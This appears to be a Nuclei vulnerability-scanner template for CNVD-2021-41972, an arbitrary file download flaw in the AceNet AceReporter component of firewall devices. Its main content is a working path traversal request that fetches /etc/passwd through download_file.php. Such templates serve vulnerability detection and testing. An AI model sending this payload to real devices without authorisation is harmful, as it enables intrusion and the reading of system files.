# Nuclei Template: AceNet AceReporter Report - Arbitrary File Download
**Template ID:** CNVD-2021-41972
**Vulnerability Class:** Path Traversal
**Severity:** High
**Source:** Nuclei Template (`CNVD-2021-41972.yaml`)

## Vulnerability Information & PoC

## Description
All firewall devices that use the AceNet AceReporter report component can download arbitrary files

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/view/action/download_file.php?filename=../../../../../../../../../etc/passwd&savename={{filename}}.txt
```
